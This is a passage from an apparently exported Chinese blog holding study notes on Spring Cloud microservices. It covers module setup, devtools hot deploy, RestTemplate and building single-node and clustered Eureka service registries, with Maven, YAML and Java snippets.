<h3 id="AT模式如何做到对业务的无侵入"><a href="#AT模式如何做到对业务的无侵入" class="headerlink" title="AT模式如何做到对业务的无侵入"></a>AT模式如何做到对业务的无侵入</h3><p><a href="http://seata.io/zh-cn/docs/dev/mode/at-mode.html">http://seata.io/zh-cn/docs/dev/mode/at-mode.html</a></p>
<p><img src="https://csn.damyoung.cn/image-20210205170700906.png" alt="image-20210205170700906"></p>
]]></content>
      <categories>
        <category>spring</category>
      </categories>
      <tags>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>springCloud</title>
    <url>/2021/01/28/SpringCloud/</url>
    <content><![CDATA[<h1 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a>微服务</h1><p>Spring Cloud是分布式微服务架构的一站式解决方案，是多种微服务架构落地技术的集合体</p>
<p><a href="https://start.spring.io/actuator/info">https://start.spring.io/actuator/info</a> 查看springcloud适配版本号</p>
<table>
<thead>
<tr>
<th>服务注册中心</th>
<th>服务调用</th>
<th>服务降级/熔断</th>
<th>服务网关</th>
<th>服务配置</th>
<th>服务总线</th>
<th>消息驱动</th>
<th>分布式请求链路跟踪</th>
</tr>
</thead>
<tbody><tr>
<td>Eureka</td>
<td>Ribbon(LoadBalancer)</td>
<td>Hystrix</td>
<td>Zuul(弃用)</td>
<td>Config</td>
<td>Bus</td>
<td>RabbirMq</td>
<td>zipkin</td>
</tr>
<tr>
<td>Zookeeper</td>
<td>openFeign</td>
<td>SpringCloudAlibaba Sentinel</td>
<td>gateWay</td>
<td>Nacos</td>
<td>Nacos</td>
<td>RocketMq</td>
<td></td>
</tr>
<tr>
<td>Consul</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>Kafka</td>
<td></td>
</tr>
<tr>
<td>Nacos</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<a id="more"></a>

<h2 id="微服务模块编写"><a href="#微服务模块编写" class="headerlink" title="微服务模块编写"></a>微服务模块编写</h2><blockquote>
<p>没有指定端口号默认是80</p>
</blockquote>
<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol>
<li>建module</li>
<li>改pom</li>
<li>写yml</li>
<li>主启动springboot Application</li>
<li>业务类</li>
</ol>
<blockquote>
<p>浏览器对post请求不太支持，用postman工具模拟，浏览器一般使用get请求进行数据浏览</p>
</blockquote>
<p>创建子模块cloud-api-commons,用于整合重复pojo</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloud-api-commons<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;project.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="热部署"><a href="#热部署" class="headerlink" title="热部署"></a>热部署</h3><p>自动热部署devtools</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>adding plugin to 父工程pom</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fork</span>&gt;</span>true<span class="tag">&lt;/<span class="name">fork</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">addResources</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addResources</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210121172154744.png" alt="image-20210121172154744"></p>
<blockquote>
<ul>
<li>crtl+shrit+alt+/</li>
</ul>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20210121173147260.png" alt="image-20210121173147260"></p>
<h2 id="RestTemplate"><a href="#RestTemplate" class="headerlink" title="RestTemplate"></a>RestTemplate</h2><p><code>RestTemplate</code>是便捷访问 restful服务模板类，是spring提供用于访问 Rest服务的 客户端模板工具类</p>
<ul>
<li><code>restTemplate.getForObject(url,requestMap,ResponseBean.class)</code>代表Rest请求地址、请求参数、Http响应转换成的对象类</li>
</ul>
<h2 id="服务编写约定"><a href="#服务编写约定" class="headerlink" title="服务编写约定"></a>服务编写约定</h2><blockquote>
<p>在pom.xml中均有</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--引入自己定义的api通用包，可以使用payment支付Entity--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloud-api-commons<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--boot web actuator--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--一般通用配置--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="服务注册与发现"><a href="#服务注册与发现" class="headerlink" title="服务注册与发现"></a>服务注册与发现</h1><h2 id="Eureka"><a href="#Eureka" class="headerlink" title="Eureka"></a>Eureka</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><h4 id="服务治理"><a href="#服务治理" class="headerlink" title="服务治理"></a>服务治理</h4><p>SpringCloud封装了Netflix公司开发的 Eureka 模块来实现 服务治理</p>
<p>在传统的rpc远程调用框架中，管理每个服务与服务之间依赖关系比较复杂，<strong>管理</strong>比较复杂，所以需要使用<strong>服务治理</strong>，管理服务与服务之间依赖关系，可以实现<strong>服务调用、负载均衡、容错</strong>等，实现<strong>服务发现与注册</strong></p>
<h4 id="服务注册"><a href="#服务注册" class="headerlink" title="服务注册"></a>服务注册</h4><p>Eureka采用CS设计架构，<code>Eureka Server </code>作为服务注册功能的服务器，它是<strong>服务注册中心</strong>。</p>
<p>而系统中的其他微服务，使用Eureka的客户端连接到 Eureka Server并维持<strong>心跳连接</strong>，这样系统的维护人员就可以通过<code>Eureka Server </code>来监控系统各个微服务是否正常运行</p>
<p>在服务注册与发现中，有一个注册中心，当服务器启动时，会把当前自己服务器的信息比如 服务地址通讯地址等以<strong>别名方式注册</strong>到注册中心上，另一方(消费者/服务提供者),以该别名的方式去注册中心上获取到实际的服务通讯地址，然后在实现本地RPC调用</p>
<p>RPC远程调用框架核心设计中心思想:在于注册中心，因为使用注册中心管理每个服务与服务之间的一个依赖关系(服务治理概念)。在任何rpc远程框架中，都会有一个注册中心(存放服务地址相关信息(接口地址))</p>
<p><img src="https://csn.damyoung.cn/image-20210122210303331.png" alt="image-20210122210303331"></p>
<h4 id="俩个组件"><a href="#俩个组件" class="headerlink" title="俩个组件"></a>俩个组件</h4><p>Eureka包含俩个组件：<code>Eureka Server</code> 和 <code>Eureka Client</code></p>
<p><code>Eureka Server</code>提供服务注册服务，每个微服务节点通过配置启动后，会在<code>Eureka Server</code>中进行注册，这样<code>Eureka Server</code>中的服务注册表将会存储所有可用服务节点的信息，服务节点的信息可以在界面中直观看到</p>
<p><code>Eureka Client</code> 通过注册中心进行访问，是一个Java客户端，用于简化<code>Eureka Server</code>的交互，客户端同时也具备一个内置的、使用轮询(<code>round-robin</code>)负载算法的负载均衡器。在应用启动后，将会向<code>Eureka Server</code>发送心跳(默认周期为30秒)。如果<code>Eureka Server</code>在多个心跳周期没有接收到某个节点的心跳，<code>Eureka Server</code>将会从服务注册表中把这个服务节点移除(默认90秒)</p>
<h4 id="访问注册中心"><a href="#访问注册中心" class="headerlink" title="访问注册中心"></a>访问注册中心</h4><blockquote>
<p>通过<code>Eureka Server</code>注册中心配置文件指定的<code>eureka.client.server-url.defaultZone=&quot; &quot;</code></p>
</blockquote>
<p>例如:<a href="http://localhost:7001得到注册信息">http://localhost:7001得到注册信息</a></p>
<h3 id="构建单机Eureka"><a href="#构建单机Eureka" class="headerlink" title="构建单机Eureka"></a>构建单机Eureka</h3><p><img src="https://csn.damyoung.cn/image-20210125001252598.png" alt="image-20210125001252598"></p>
<h4 id="Eureaka-Server7001"><a href="#Eureaka-Server7001" class="headerlink" title="Eureaka Server7001"></a>Eureaka Server7001</h4><blockquote>
<p>主启动类中的<code>@EnableEurekaServer</code>注解表明这是Eureka服务端</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--eureka server--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">7001</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#eureka服务端的实例名称</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">localhost</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line"><span class="comment">#    false表示不向注册中心注册自己</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">false</span></span><br><span class="line"><span class="comment">#    false表示自己端就是注册中心，我的职责就是维护服务实例</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">false</span></span><br><span class="line"><span class="comment">#    设置与Eureka Server交互的地址查询服务和注册服务都需要依赖地址</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://$&#123;eureka.instance.hostname&#125;:$&#123;server.port&#125;/eureka/</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableEurekaServer</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EurekaMain7001</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(EurekaMain7001.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ServiceProvider8001"><a href="#ServiceProvider8001" class="headerlink" title="ServiceProvider8001"></a>ServiceProvider8001</h4><blockquote>
<p>主启动类中的<code>@EnableEurekaClient</code>注解表明这是Eureka服务端</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableEurekaClient</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Payment8001</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(Payment8001.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Eureka Client --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- MyBatis --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Druid连接池 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--mysql-connector-java--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--jdbc--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8001</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line"><span class="comment">#    微服务名称</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-payment-service</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">com.alibaba.druid.pool.DruidDataSource</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/db2019?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=UTC</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">mapperLocations:</span> <span class="string">classpath:mappers/*.xml</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">com.example.pojo</span>    <span class="comment"># 所有Entity别名类所在包</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line"><span class="comment">#    表示是否将自己注册进EurekaServer默认为true</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line"><span class="comment">#    是否从EurekaServer抓取已有的注册信息,默认为true</span></span><br><span class="line"><span class="comment">#    单节点无所谓，集群必须设置为true才能配合Ribbon使用负载均衡</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210125001031943.png" alt="image-20210125001031943"></p>
<h4 id="ServiceConsumer80"><a href="#ServiceConsumer80" class="headerlink" title="ServiceConsumer80"></a>ServiceConsumer80</h4><blockquote>
<p>同样指定<code>@EnableEurekaClient</code></p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--eureka-client--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-order-service</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line"><span class="comment">#    表示是否将自己注册进EurekaServer默认为true</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line"><span class="comment">#    是否从EurekaServer抓取已有的注册信息,默认为true;单节点无所谓，集群必须设置为true才能配合Ribbon使用负载均衡</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableEurekaClient</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderMain80</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(OrderMain80.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210125002352273.png" alt="image-20210125002352273"></p>
<h3 id="Eureka集群"><a href="#Eureka集群" class="headerlink" title="Eureka集群"></a>Eureka集群</h3><p>微服务RPC远程服务调用最核心的是：高可用，注册中心只有一个，出现故障就会整个服务环境不可用</p>
<p>解决：搭建Eureka注册中心集群，实现<strong>负载均衡+故障容错</strong></p>
<h4 id="Eureka-Server"><a href="#Eureka-Server" class="headerlink" title="Eureka Server"></a>Eureka Server</h4><ul>
<li><p>服务注册：将服务信息注册进注册中心</p>
</li>
<li><p>服务发现：从注册中心获取服务信息</p>
</li>
</ul>
<p>实质：存key服务命令，取value调用地址</p>
<h4 id="Service-Provider"><a href="#Service-Provider" class="headerlink" title="Service Provider"></a>Service Provider</h4><ol>
<li>先启动Eureka注册中心</li>
<li>启动服务提供者payment支付服务</li>
<li>支付服务启动会将自身信息(比如服务地址以别名方式注册进Eureka)</li>
<li>消费者order服务在需要调用接口时，使用服务别名去 注册中心获取实际的RPC远程调用地址</li>
<li>消费者获得调用后，底层实际是利用httpClient技术实现远程调用</li>
<li>消费者获得服务地址后会缓存在本地jvm内存中，默认每隔30秒更新一次服务地址</li>
</ol>
<h4 id="集群环境"><a href="#集群环境" class="headerlink" title="集群环境"></a>集群环境</h4><blockquote>
<p>互相注册，相互守望</p>
</blockquote>
<ol>
<li>修改配置文件C:/Windows/System32/drivers/etc/hosts</li>
</ol>
<p><img src="https://csn.damyoung.cn/image-20210125115823993.png" alt="image-20210125115823993"></p>
<ol start="2">
<li>Eureka Server配置文件配置</li>
</ol>
<blockquote>
<p>若是3台以上Eureka Server</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">defaultZone:</span> <span class="string">http://eureka7001.com:7001/eureka,http://eureka7002.com:7002/eureka</span></span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">7002</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#eureka服务端的实例名称</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">eureka7002.com</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="comment">#    false表示不向注册中心注册自己</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment">#    false表示自己端就是注册中心，我的职责就是维护服务实例</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment">#    设置与Eureka Server交互的地址查询服务和注册服务都需要依赖地址</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7001.com:7001/eureka/</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">7001</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#eureka服务端的实例名称</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line"><span class="comment">#    eureka服务端的实例名称</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">eureka7001.com</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line"><span class="comment">#    false表示不向注册中心注册自己</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">false</span></span><br><span class="line"><span class="comment">#    false表示自己端就是注册中心，我的职责就是维护服务实例</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">false</span></span><br><span class="line"><span class="comment">#    设置与Eureka Server交互的地址查询服务和注册服务都需要依赖地址</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7002.com:7002/eureka/</span></span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210125172301120.png" alt="image-20210125172301120"></p>
<h4 id="测试集群"><a href="#测试集群" class="headerlink" title="测试集群"></a>测试集群</h4><ol>
<li><p>启动EurekaServer7001/7002</p>
</li>
<li><p>再启动服务提供者8001，以及服务消费者80；可以在web页面看到微服务已经被注册</p>
</li>
<li><p>服务提供者：<a href="http://localhost//payment/get/31">http://localhost//payment/get/31</a></p>
<p>服务消费者：<a href="http://localhost/consumer/payment/get/31">http://localhost/consumer/payment/get/31</a></p>
</li>
</ol>
